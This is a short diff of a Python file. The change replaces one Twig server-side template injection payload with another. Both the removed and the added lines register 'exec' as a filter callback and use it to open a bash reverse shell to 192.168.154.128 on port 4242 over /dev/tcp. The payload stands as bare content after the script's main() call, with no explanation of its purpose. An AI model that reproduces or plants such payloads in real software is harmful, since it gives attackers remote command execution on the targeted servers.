@@ -22,7 +22,7 @@ if __name__ == '__main__':
     main()
 
     
-     {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("/bin/bash -l > /dev/tcp/192.168.154.128/4242 0<&1 2>&1")}}
+     {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash -i >& /dev/tcp/192.168.154.128/4242 0>&1")}}
         
         
         
